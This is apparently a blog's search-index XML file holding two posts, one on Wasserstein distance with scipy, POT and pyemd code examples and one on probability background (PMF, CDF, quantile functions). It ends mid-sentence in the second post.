<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Delve into Wasserstein Distance, principles and implementation analysis</title>
      <link href="/blog/2023/09/18/ml/wasserstein_dist/"/>
      <url>/blog/2023/09/18/ml/wasserstein_dist/</url>
      
        <content type="html"><![CDATA[<h2 id="wasserstein-distance">Wasserstein distance</h2><p>To understand Wasserstein distance fully, It's suggested to firstrecap the related background of probability theory, which can be seen inmy another blog <ahref="https://realyee.github.io/blog/2023/09/18/math/probabilities/wasserstein_bg/">Probabilitiesbackground for Wasserstein Distance</a></p><p>Wasserstein distance (also called Wasserstein distance,, optimaltransport) is a metric that quantifies the difference between twoprobability distributions, which is originally proposed in IJCV'2020《The Earth Mover's Distance as a Metric for Image Retrieval》. It is anormalized measure of the minimum cost of turning one distribution intothe other, which can be used to measure the distance between twomulti-dimensional distributions. The cost is determined by the<strong>amount</strong> of "mass" that needs to be moved and the<strong>distance</strong> it needs to be moved.</p><h3 id="definitions">Definitions</h3><p><span class="math display">\[\begin{equation}W\left(\mathbb{P}_r, \mathbb{P}_g\right)=\inf _{\gamma \in\Pi\left(\mathbb{P}_r, \mathbb{P}_g\right)} \mathbb{E}_{(x, y) \sim\gamma}[\|x-y\|]\end{equation}\]</span></p><p><span class="math inline">\(\prod(\mathbb{P}_r,\mathbb{P}_g)\)</span> is the set of all joint distributions whosemarginals are <span class="math inline">\(P_r\)</span> and <spanclass="math inline">\(P_g\)</span>. The objective is find a jointdistribution <span class="math inline">\(\gamma \in \prod(\mathbb{P}_r,\mathbb{P}_g)\)</span> to minimizes the expectation of the distancebetween <span class="math inline">\(x\)</span> and <spanclass="math inline">\(y\)</span>. The distance <spanclass="math inline">\(||x-y||\)</span> can be defined as any distancemetric, such as Euclidean distance, etc. The minimum expection is theWasserstein distance between <span class="math inline">\(P_r\)</span>and <span class="math inline">\(P_g\)</span>.</p><p>For Discrete variables, the Wasserstein distance can be definedas:</p><p>Let</p><p>$$ <span class="math display">\[\begin{equation}\begin{aligned}P &amp;=\{(\mathbf{p}_1, w_{p_1}),(\mathbf{p}_2, w_{p_2}),(\mathbf{p}_3,w_{p_3}), \cdots,(\mathbf{p}_M, w_{p_M})\}, \\Q &amp;=\{(\mathbf{q}_1, w_{q_1}),(\mathbf{q}_2, w_{q_2}),(\mathbf{q}_3,w_{q_3}), \cdots,(\mathbf{q}_N, w_{q_N})\},\end{aligned}\end{equation}\]</span> $$</p><p>where <span class="math inline">\(p_i\)</span> is the <spanclass="math inline">\(i\)</span>-th point in <spanclass="math inline">\(P\)</span>, <spanclass="math inline">\(w_{p_i}\)</span> is the weight of <spanclass="math inline">\(p_i\)</span>, <spanclass="math inline">\(q_j\)</span> is the <spanclass="math inline">\(j\)</span>-th point in <spanclass="math inline">\(Q\)</span>, <spanclass="math inline">\(w_{q_j}\)</span> is the weight of <spanclass="math inline">\(q_j\)</span>. The <spanclass="math inline">\(d_{ij}\)</span> is the distance between <spanclass="math inline">\(P_i\)</span> and <spanclass="math inline">\(q_j\)</span>. The Wasserstein distance between<span class="math inline">\(P\)</span> and <spanclass="math inline">\(Q\)</span> is defined as:</p><p><span class="math display">\[\begin{equation}\begin{aligned}&amp; \min \sum_{i=1}^M \sum_{j=1}^N d_{i j} f_{i j} \\\text { s.t } &amp; \\&amp; f_{ij} \ge 0,\quad i=1,2, \cdots, M ; j=1,2, \cdots, N \\&amp; \sum_{j=1}^N f_{ij} \leq w_{p_i}, i=1,2, \cdots, M \\&amp; \sum_{i=1}^M f_{ij} \leq w_{q_j}, j=1,2, \cdots, N \\&amp; \sum_{i=1}^M \sum_{j=1}^N f_{ij}=\min \left\{\sum_{i=1}^M w_{p_i},\sum_{j=1}^M w_{p_j}\right\}\end{aligned}\end{equation}\]</span></p><p>EMD is proved to be distance(距离定义必须满足三点：正定性，齐次性，三角不等式) in the originalpaper. Note that the sum of weight of two difference distribution can beunequal.</p><h3 id="two-equavalent-formulas">Two equavalent formulas</h3><p>The above definitions is all about optimization. In <ahref="https://arxiv.org/pdf/2111.03570.pdf">Why the 1-Wassersteindistance is the area between the two marginal CDFs</a> and <ahref="https://arxiv.org/abs/1509.02237">On Wasserstein Two SampleTesting and Related Families of Nonparametric Tests</a>, Two equavalentformulas of 1-Wasserstein distance is proved, which are more easily toimplement.</p><p>For quantile function,</p><p><span class="math display">\[\begin{equation}W_1(X, Y)=\int_{[0,1]}\left|F_X^{-1}(u)-F_Y^{-1}(u)\right| du\end{equation}\]</span></p><p>For cumulative ditribution function,</p><p><span class="math display">\[\begin{equation}W_1(u, v) = \int_{-\infty}^{+\infty} |U-V|\end{equation}\]</span></p><p>1-Wasserstein distance is the area between the two marginal empiricalCDFs</p><h3 id="three-intuitive-and-typical-examples">Three intuitive andtypical examples</h3><ol type="1"><li><p>Computing the distance of point clouds with differentdistribution</p><p>As show in the following figure, there are three point clouds withdifferent distribution, which one is closest to the other two? Blue andred? Red and green? Green and blue?</p><p>How to define a distance measure aligning with our intuition aboutthe geometry and distance of the point cloud? The solution is EarthMover's Distance (EMD)</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/dot_cloud_emd.png"alt="point cloud for EMD" /><figcaption aria-hidden="true">point cloud for EMD</figcaption></figure></li><li><p>Assume the two probability distribution as dirt and hole, EMD isthe cost that needs to be done to move all the dirt to all theholes.</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/dirt_hole_emd.png"alt="Move the earth to the hole" /><figcaption aria-hidden="true">Move the earth to the hole</figcaption></figure><p>Let us call the above point clouds as sample set A, B, C, which canbe regarded as a discrete probability distribution. For each sample<span class="math inline">\(x \in A\)</span>, there is <spanclass="math inline">\(p_x = \frac{1}{|A|}\)</span>, where |A| is thetotal number of points in sample set A. The distance between sample setA and B can be solved by the following linear program:</p><blockquote><p>recall probabilities：a probability mass function (pmf) is a functionthat gives the probability that a discrete random variable is exactlyequal to some value. The probability density function (pdf) is used todescribe probabilities for continuous random variables. It'scounterpart.</p></blockquote><p>Each <span class="math inline">\(x \in A\)</span> corresponds to apile of dirt with height <span class="math inline">\(p_x\)</span>, andeach <span class="math inline">\(y \in B\)</span> corresponds to a holewith depth <span class="math inline">\(p_y\)</span>. The cost of movinga unit of dirt from x to y is the Euclidean distance between the twopoints, denoted as <span class="math inline">\(d(x, y)\)</span>. Let<span class="math inline">\(Z_{x,y}\)</span> represent the amount ofdirt moved from <span class="math inline">\(x \in A\)</span> to <spanclass="math inline">\(y \in B\)</span>, then the constraints are asfollows:</p><ul><li>Each <span class="math inline">\(Z_{x,y} \ge 0\)</span>, so dirt canonly moves from x to y.</li><li>Every pile <span class="math inline">\(x \in A\)</span> must vanish,i.e. for each fixed <span class="math inline">\(x \in A\)</span>, <spanclass="math inline">\(\sum_{y \in B} Z_{x,y} = p_x\)</span>.</li><li>Every hole <span class="math inline">\(y \in B\)</span> must becompletely filled, i.e. for each fixed <span class="math inline">\(y \inB\)</span>, <span class="math inline">\(\sum_{y \in B} Z_{x,y} =p_x\)</span></li></ul><p>The objective is to minimize the cost of moving the dirt, i.e. <spanclass="math inline">\(\sum_{x,y \in AxB}d(x,y)Z(x,y)\)</span>, subjectto the linear constraints:</p><p><span class="math display">\[\sum_{x, y \in A \times B}d(x, y)Z_{x,y} \\s.t \space\{     \begin{split}     &amp;Z_{x,y} \ge 0\\     &amp;\sum_{y \in B} Z_{x,y} = p_x\\     &amp;\sum_{x \in A} Z_{x,y} = p_y \\     \end{split}\}\]</span></p></li></ol><h2 id="python-tools-for-implementation">Python tools forimplementation</h2><p>Common used tools for Wasserstein distance implementation:</p><ol type="1"><li><a href="https://github.com/google/or-tools">google/or-tools:Google's Operations Research tools:</a>,</li><li>scipy,<code>from scipy.stats import wasserstein_distance</code></li><li><a href="https://pythonot.github.io/index.html">POT: Python OptimalTransport — POT Python Optimal Transport 0.9.0 documentation</a></li><li><a href="https://github.com/wmayner/pyemd">wmayner/pyemd: Fast EMDfor Python: a wrapper for Pele and Werman's C++ implementation of theEarth Mover's Distance metric</a></li></ol><p>An online tools to calculate Wasserstein distance: <ahref="https://demonstrations.wolfram.com/MongeKantorovichTransportationProblem/">Monge-KantorovichTransportation Problem - Wolfram Demonstrations Project</a></p><h3 id="scipy-1d-wasserstein-distance">scipy 1d Wassersteindistance</h3><p><code>scipy.stats.wasserstein_distance</code> applies to 1DWasserstein and directly uses L1 norm as the distance metric.</p><p>Definitions is the best way to learn: <ahref="https://docs.scipy.org/doc/scipy/reference/generated/scipy.stats.wasserstein_distance.html#scipy-stats-wasserstein-distance">scipy.stats.wasserstein_distance— SciPy v1.11.1 Manual</a>:</p><blockquote><p>scipy.stats.wasserstein_distance(u_values, v_values, u_weights=None，v_weights=None) Compute the first Wasserstein distance between two 1Ddistributions.</p><p>This distance is also known as the earth mover’s distance, since itcan be seen as the minimum amount of “work” required to transform <spanclass="math inline">\(u\)</span> into <spanclass="math inline">\(v\)</span>, where “work” is measured as the amountof distribution weight that must be moved, multiplied by the distance ithas to be moved.</p></blockquote><blockquote><p>u_values, v_values array_like</p><ul><li>Values observed in the (empirical) distribution.</li></ul><p>u_weights, v_weights array_like, optional</p><ul><li>Weight for each value. If unspecified, each value is assigned thesame weight. u_weights (resp. v_weights) must have the same length asu_values (resp. v_values). If the weight sum differs from 1, it muststill be positive and finite so that the weights can be normalized tosum to 1.</li></ul></blockquote><p>解释：</p><ol type="1"><li><p>This function is for Wasserstein-1 distance, where the distanced(x,y) is the L1 norm, absolute value. It's only appliable to 1Ddistribution, which means 2D distribution should be flatten to1D.(especially for machine learning weights or images, which is 2Ddistribution or more)</p></li><li><p>u_values, v_values are the values observed in the (empirical)distribution, which is the samples drawed from the distribution.</p><p>Corresponding to the above example: the position coordinates of thepoint in the point cloud or the coordinates of dirt and holes.</p></li><li><p>u_weights, v_weights correspond to the weight of each sample inall samples.</p><p>Corresponding to the above example:</p><ol type="1"><li><p>The weighted number of points at this position in the point cloud(because it is a fraction with weighted sum is 1, so it is called theweighted number)</p></li><li><p>The weighted height, how much, and how deep the dirt and hole areat this position, that is, <span class="math inline">\(p_x\)</span>,<span class="math inline">\(p_y\)</span></p></li><li><p>If not specified, the default weights are equal on average. Ifspecified, it needs to be a positive integer and will be normalized to1</p></li></ol></li><li><p>Normally, The way to get wasserstein-1 distance is calculatingthe <strong>distance cost</strong> through u_values, v_values, calculate<strong>the quality or quantity</strong> through u_weights, v_weights,and then establish variables between each point from p to q samples tosolve the linear minimum optimization problem.</p></li></ol><h3id="scipy.stats.wasserstein_distance-sourcecode-analysis">scipy.stats.wasserstein_distancesourcecode analysis</h3><p>However, <strong>in the scipy function, the wasserstein distance iscalculated using the empirical CDFs related definitions in Equation7</strong></p><p>In function <code>scipy.stats.wasserstein_distance</code>, thefunction<code>_cdf_distance(1, u_values, v_values, u_weights, v_weights)</code>is called with <span class="math inline">\(p=1\)</span> as wasserstein-1distance.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">def _cdf_distance(p, u_values, v_values, u_weights=None, v_weights=None):</span><br><span class="line">    # validate whether it&#x27;s a distribution</span><br><span class="line">    u_values, u_weights = _validate_distribution(u_values, u_weights)</span><br><span class="line">    v_values, v_weights = _validate_distribution(v_values, v_weights)</span><br><span class="line"></span><br><span class="line">    # Sort u and v in ascending order and store the sorted indices</span><br><span class="line">    u_sorter = np.argsort(u_values)</span><br><span class="line">    v_sorter = np.argsort(v_values)</span><br><span class="line"></span><br><span class="line">    # concatenate the two samples and sort them in ascending order</span><br><span class="line">    all_values = np.concatenate((u_values, v_values))</span><br><span class="line">    all_values.sort(kind=&#x27;mergesort&#x27;)</span><br><span class="line"></span><br><span class="line">    # Compute the differences between pairs of successive values of u and v.</span><br><span class="line">    deltas = np.diff(all_values)</span><br><span class="line"></span><br><span class="line">    # Get the respective positions of the values of u and v among the values of</span><br><span class="line">    # both distributions.</span><br><span class="line">    u_cdf_indices = u_values[u_sorter].searchsorted(all_values[:-1], &#x27;right&#x27;)</span><br><span class="line">    v_cdf_indices = v_values[v_sorter].searchsorted(all_values[:-1], &#x27;right&#x27;)</span><br><span class="line"></span><br><span class="line">    # Calculate the CDFs of u and v using their weights, if specified.</span><br><span class="line">    if u_weights is None:</span><br><span class="line">        u_cdf = u_cdf_indices / u_values.size</span><br><span class="line">    else:</span><br><span class="line">        u_sorted_cumweights = np.concatenate(([0],</span><br><span class="line">                                              np.cumsum(u_weights[u_sorter])))</span><br><span class="line">        u_cdf = u_sorted_cumweights[u_cdf_indices] / u_sorted_cumweights[-1]</span><br><span class="line"></span><br><span class="line">    if v_weights is None:</span><br><span class="line">        v_cdf = v_cdf_indices / v_values.size</span><br><span class="line">    else:</span><br><span class="line">        v_sorted_cumweights = np.concatenate(([0],</span><br><span class="line">                                              np.cumsum(v_weights[v_sorter])))</span><br><span class="line">        v_cdf = v_sorted_cumweights[v_cdf_indices] / v_sorted_cumweights[-1]</span><br><span class="line"></span><br><span class="line">    # Compute the value of the integral based on the CDFs.</span><br><span class="line">    # If p = 1 or p = 2, we avoid using np.power, which introduces an overhead</span><br><span class="line">    # of about 15%.</span><br><span class="line">    if p == 1:</span><br><span class="line">        return np.sum(np.multiply(np.abs(u_cdf - v_cdf), deltas))</span><br><span class="line">    if p == 2:</span><br><span class="line">        return np.sqrt(np.sum(np.multiply(np.square(u_cdf - v_cdf), deltas)))</span><br><span class="line">    return np.power(np.sum(np.multiply(np.power(np.abs(u_cdf - v_cdf), p),</span><br><span class="line">                                       deltas)), 1/p)</span><br></pre></td></tr></table></figure><p>To illustrate the above code, let's take a look at the followingexample,</p><p><code>scipy.stats.wasserstein_distance(u_values=np.array([2, 10, 6]), v_values=np.array([12, 4, 2]))</code>with CDF figure as follows: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/emd_example.jpg"alt="emd_example" /></p><ol type="1"><li><p>Find the cutoff point for CDF</p><p><code>all_values = [2, 2, 4, 6, 10, 12]</code></p><p>Merging the lists of u and v is equivalent to marking the positionsof the values of two distribution on the coordinate axis, which is alsothe point of the Empircal CDF difference between the twodistribution.</p></li><li><p>Get the CDF of each distribution</p><ol type="1"><li><p>sort the two distribution in ascending order,<code>u_values[u_sorter]=[2, 6, 10], v_values[v_sorter] = [2, 4, 12]</code></p></li><li><p>find the number of samples less than <spanclass="math inline">\(x_i\)</span>, and than divide the size ofdistribution</p><p><span class="math display">\[\begin{equation}F_n(x_t) = \frac{\text{number of elements in the samples} \le x_t}{n} =\frac{1}{n}\sum_{i=1}^n I_{x_i \le x_t},\end{equation}\]</span></p></li></ol><p><code>u_cdf_indices = [1, 1, 1, 2, 3], v_cdf_indices= [1, 1, 2, 2, 2]</code></p><p>CDF = <code>u_cdf_indices / u_values.size</code></p><p>number of elements less than <span class="math inline">\(x_i\)</span>=<code>u_values[u_sorter].searchsorted(all_values[:-1], 'right')</code>.Due to the discrete nature, scipy get the CDF of the cutoff points (CDFdifferent places) through the above code (Actually, we can calculate theCDF value at any discrete coordinate, but it's unnecessary; we only needto compute it for the cutoff coordinates). For instance, for the 3rdcutoff element <span class="math inline">\(x_i = 4\)</span>, it find thenumber of elements less than <span class="math inline">\(x_i =4\)</span> in <code>u_values[u_sorter]</code>, which is the <spanclass="math inline">\(F_X(x_i=4) * size(u\_values)\)</span>.</p><p>Although the cutoff point coordinate can be repeated, the distancebetween the two repeated points is 0, so it does not affect thecalculation of the distance.</p></li><li><p>Get the CDF value differences of two distribution as theprobability 'mass' in <span class="math inline">\(x\)</span>.</p><p><code>np.abs(u_cdf - v_cdf)</code>: the difference of empirical CDFvalues at the cutoff points, which is the probability 'mass' in <spanclass="math inline">\(x\)</span>.</p></li><li><p>Get the distance to move from <spanclass="math inline">\(u_i\)</span> to <spanclass="math inline">\(v_i\)</span>.</p><p><code>deltas = np.diff(all_values)</code>: the distance between twocutoff points, which is the distance to move from <spanclass="math inline">\(u_i\)</span> to <spanclass="math inline">\(v_i\)</span>.</p></li><li><p>Sum the multiplication of the above two values in terms of <spanclass="math inline">\(x\)</span></p><p>For instance, when <span class="math inline">\(4 \le x_i \lt6\)</span>,</p><p><span class="math inline">\(F_X(4)\)</span> = u_cdf(<spanclass="math inline">\(X \le x_i\)</span>) = u_cdf[2] = 1</p><p><span class="math inline">\(F_Y(4)\)</span> = v_cdf(<spanclass="math inline">\(Y \le x_i\)</span>) = v_cdf[2] = 2$</p><p><code>delta[2] =all_values[3] - all_values[2] =6-4=2</code></p><p>According to Equation 7, the distance to move from <spanclass="math inline">\(u_i\)</span> to <spanclass="math inline">\(v_i\)</span> in <spanclass="math inline">\(F(4)\)</span> is <spanclass="math inline">\(2*|1-2| = 2\)</span>.</p></li></ol><p>Recommend for Corresponding Python code: <ahref="https://blog.csdn.net/weixin_44589540/article/details/129720028">Python计算累积分布函数 CDF 并绘图_python cdf 函数-CSDN 博客</a></p><h2 id="more-examples-and-tests-for-other-libraries">More Examples andTests for other libraries</h2><h3 id="scipy-use-cases">scipy use cases</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from scipy.stats import wasserstein_distance</span><br><span class="line"></span><br><span class="line">def wassersteindist(n):</span><br><span class="line">    a = np.random.randn(n)</span><br><span class="line">    b = np.random.randn(n)</span><br><span class="line">    w = wasserstein_distance(a,b)</span><br><span class="line">    return w</span><br><span class="line"></span><br><span class="line">print(np.mean([wassersteindist(100) for r in range(1000)]))</span><br><span class="line">print(np.mean([wassersteindist(1000) for r in range(1000)]))</span><br><span class="line">print(np.mean([wassersteindist(10000) for r in range(1000)]))</span><br><span class="line"># OUTPUT</span><br><span class="line"># 0.17644314409413253</span><br><span class="line"># 0.05818221578545196</span><br><span class="line"># 0.018522773678086024</span><br></pre></td></tr></table></figure><p>解读：np.random.randn 返回标准正态分布(mean=0, std=1, Gaussiandistribution) 的采样, a, b都是同一分布的采样点。对于同一分布采样点来说，样本量越大越接近其分布，而二者分布一样，因此二者的wasserstein distance 随着样本量逐渐增大会趋近于 0。</p><p>Wasserstein距离是一种用于衡量两个概率分布之间距离的方法，它考虑了分布之间的相似性和几何距离之间的关系。它有许多应用，例如生成对抗网络（GAN）中的损失函数和图像检索中的相似性度量。</p><p>Wasserstein距离的定义基于最小化将一个分布转换为另一个分布所需的成本。成本可以是任意的，但通常是指将一个分布中的质量从一个位置移动到另一个位置所需的成本。这个成本可以表示为两个位置之间的距离和质量的乘积。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from scipy.stats import wasserstein_distance</span><br><span class="line"></span><br><span class="line">a, b = [2,1,3,4], [4,1,2,4]</span><br><span class="line">w = wasserstein_distance(a,b)</span><br><span class="line">print(w)</span><br></pre></td></tr></table></figure><h3 id="wasserstein-p-distance">Wasserstein-p distance</h3><p>如果要计算 p-Wasserstein distance between two 1d distributions,也就是以 p 范数为距离衡量的 wasserstein distance，那 scipy的功能就不行了，可以采用以下 <ahref="https://github.com/PythonOT/POT">PythonOT/POT: POT : PythonOptimal Transport</a>的库函数：<code>ot.wasserstein_1d(u_values, v_values, u_weights=None, v_weights=None, p=1, require_sort=True)</code>,直接指定 p 范数的值即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import ot</span><br><span class="line">pos_p, pos_q = np.array([0, 5]), np.array([0, 1])</span><br><span class="line">counts_p, counts_q = np.array([3/4, 1/4]), np.array([1/2, 1/2])</span><br><span class="line">ot.backend = &#x27;numpy&#x27;</span><br><span class="line"></span><br><span class="line">ot.wasserstein_1d(pos_p, pos_q, u_weights=counts_p, v_weights=counts_q, p=2, require_sort=True)</span><br></pre></td></tr></table></figure><h2id="difference-between-implementations-of-scipy-potand-pyemd">Differencebetween implementations of scipy， POT，and pyemd</h2><p>这里比较 scipy 和 POT 的 wasserstein 函数和 pyemd等库实现的差异。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scipy.stats.wasserstein_distance(u_values, v_values, u_weights=None， v_weights=None)</span><br></pre></td></tr></table></figure><p>在 scipy 中，u_values, v_values 参数是从分布中采样的每个样本位置(samples drawed from distribution) ，因此无顺序可重复（实际上看函数源码可以看到对其进行排序，也可以说明其无顺序），u_weight,v_weight 对应权重，质量。scipy这种其实对机器学习中矩阵（都是样本）的距离计算挺方便的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pyemd.emd(first_histogram,</span><br><span class="line">    second_histogram,</span><br><span class="line">    distance_matrix,</span><br><span class="line">    extra_mass_penalty=-1.0)</span><br></pre></td></tr></table></figure><p>pyemd 中，first_histogram，second_histogram 是分布的频率向量（pre-computed frequency vector about the distribution或者也可以说是频率向量，mass 重量，权重，对应 scipy 中的 u_weight,v_weight, 并通过 distance_matrix 指定距离矩阵 specifying distancesbetween bins.</p><p>因此，scipy 与 pyemd 之间的差异在于参数顺序以及 位置和距离</p><p>计算两个矩阵之间的距离：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from scipy.stats import wasserstein_distance</span><br><span class="line">import numpy as np</span><br><span class="line">a = np.array([[3,4], [6,1]])</span><br><span class="line">b = np.array([[68,1], [921,4]])</span><br><span class="line">len = a.size</span><br><span class="line">wasserstein_distance(np.arange(len), np.arange(len), a.flatten(), b.flatten())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.6438631790744466</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import pyemd</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">def dist_matrix(len):</span><br><span class="line">    dist = np.empty((len, len))</span><br><span class="line">    for i in range(len):</span><br><span class="line">        for j in range(len):</span><br><span class="line">            dist[i][j] = abs(i-j)</span><br><span class="line">    return dist</span><br><span class="line"></span><br><span class="line">a = np.array([[3,4], [6,1]])</span><br><span class="line">b = np.array([[68,1], [921,4]])</span><br><span class="line">freq = lambda x: x.flatten() / np.sum(x) # compute the normalized histogram、frequency of each element</span><br><span class="line"></span><br><span class="line">pyemd.pyemd.emd(freq(a), freq(b), dist_matrix(a.size)) # cost of moving mass under L1 is constant</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OUTPUT: 0.643861793763</span><br></pre></td></tr></table></figure><p>看得出来直接计算矩阵的距离的话，用 scipy还是挺方便的，便于在机器学习中应用。</p><h2 id="applications-in-machine-learning">Applications in MachineLearning</h2><ol type="1"><li>Image Generation and Style Transfer, 在生成对抗网络 GAN中，测量真实分布与生成分布之间的距离，来构成目标函数，训练GAN，提高生成图片的质量</li><li>Domain Adaptation,量化源域与目标域的概率分布差异，从而调整源域上训练的模型</li><li>Outlier Detection,将正常分布与潜在的异常分布做对比，通过捕捉质量和位置的差异，来识别异常值</li><li>数据增强，在增强训练数据时，从尽可能接近原始数据分布的分布中进行采样来生成真实的合成值。</li></ol><h2 id="references-and-recommends">References and Recommends</h2><ol type="1"><li><ahref="https://jeremykun.com/2018/03/05/earthmover-distance/">EarthmoverDistance – Math ∩ Programming</a></li><li><a href="https://zhuanlan.zhihu.com/p/353418080">Wasserstein 距离 -知乎</a></li><li><ahref="https://rmoklesur.medium.com/understanding-wasserstein-distance-a-powerful-metric-in-machine-learning-100a1ff46b66">UnderstandingWasserstein Distance: A Powerful Metric in Machine Learning | byMoklesur Rahman | Jun, 2023 | Medium</a></li><li><ahref="https://stats.stackexchange.com/questions/605795/normalized-wasserstein-distance">python- Normalized Wasserstein distance - Cross Validated</a></li><li><ahref="https://github.com/scipy/scipy/issues/9152">wasserstein_distanceworks on distributions, not frequency vectors? · Issue #9152 ·scipy/scipy</a></li><li><ahref="https://github.com/j2kun/earthmover/tree/main">j2kun/earthmover:Implementation of the Earthmover distance metric in python.</a></li><li><ahref="https://stats.stackexchange.com/questions/519286/intuition-on-wasserstein-distance">python- Intuition on Wasserstein Distance - Cross Validated</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
        <tags>
            
            <tag> distance </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Probabilities background for Wasserstein Distance</title>
      <link href="/blog/2023/09/17/math/probabilities/wasserstein_bg/"/>
      <url>/blog/2023/09/17/math/probabilities/wasserstein_bg/</url>
      
        <content type="html"><![CDATA[<h2 id="hypothesis-testing-in-probabilities">Hypothesis Testing inProbabilities</h2><p>A statistical hypothesis test is a method of statistical inferenceused to decide whether the data at hand sufficiently support aparticular hypothesis. It including both parametric and non-parametrictests.</p><ol type="1"><li><p>Parametric Tesing</p><p>Parametric tests are those tests for which we have <strong>priorknowledge of the population distribution (i.e, normal)</strong>, or ifnot then we can easily <strong>approximate it to a normaldistribution</strong> which is possible with the help of the CentralLimit Theorem.</p><p>参数检验（parametertest）全称参数假设检验，是指当总体分布已知或可近似（如总体为正态分布）时，根据样本数据对总体分布的统计参数（例如均值、方差等）进行的统计检验。</p></li><li><p>Nonparametric Testing</p><p>Nonparametric tests can and should be broadly defined to include allmethodology that does not use a model based on a single parametricfamily.</p><p>非参数检验(Nonparametrictests)与参数检验共同构成统计推断的基本内容。在数据分析过程中，由于种种原因，人们往往无法对总体分布形态作简单假定，此时参数检验不再适用。非参数检验正是一类基于这种考虑，在总体方差未知或知道甚少的情况下，利用样本数据对总体分布形态等进行推断的方法。由于非参数检验方法在推断过程中不涉及有关总体分布的参数，因而得名为“非参数”检验。</p><p>常见的非参数检验包括：卡方检验 Chi-Squared Test, Kolmogorov–Smirnov检验, Wasserstein distance</p></li></ol><h2 id="terms">Terms</h2><p>To determine the distribution of a discrete random variable we caneither provide its Probability mass function (PMF) or cumulativedistribution function (CDF).</p><ol type="1"><li><p><strong>Probability mass function, PMF</strong></p><p>A probability mass function (pmf) is a function over the sample spaceof a <strong>discrete random variable</strong> X which gives theprobability that X is equal to a certain value. The PMF is one way todescribe the distribution of a discrete random variable (PMF cannot bedefined for continuous random variables).</p></li><li><p><strong>cumulative distribution function, CDF</strong></p><p>The cumulative distribution function (CDF) of a random variable isanother method to describe the distribution of random variables. Theadvantage of the CDF is that it can be defined for any kind of randomvariable (discrete, continuous, and mixed).</p><p>The cumulative distribution function (CDF) of random variable X isthe probability that X will take a value less than or equal to <spanclass="math inline">\(x\)</span>, <span class="math inline">\(F_X(x)=P(X\le x), \text{for all x} \in \mathcal{R}\)</span>.</p></li><li><p><strong>Probability density function</strong></p><p>For continuous random variables, the CDF is well-defined so we canprovide the CDF. However, the PMF does not work for continuous randomvariables, because for a continuous random variable <spanclass="math inline">\(P(X = x) = 0, \text{for all x} \in\mathcal{R}\)</span>. Instead, we can usually define the probabilitydensity function (PDF). The PDF is the density of probability ratherthan the probability mass.</p></li><li><p><strong>Quantile function (inverse CDF)</strong></p><p>Since the cdf <span class="math inline">\(F\)</span> is amonotonically increasing function, it has an inverse; let us denote thisby <span class="math inline">\(F^{−1}\)</span>. If 𝐹 is the cdf of 𝑋,then <span class="math inline">\(F^{−1}(\alpha)\)</span> is the value of<span class="math inline">\(x_a\)</span> such that <spanclass="math inline">\(P(X \le X_a) = \alpha\)</span>; this is called the<span class="math inline">\(\alpha\)</span> quantile of <spanclass="math inline">\(F\)</span></p><p>The cumulative distribution function takes as input 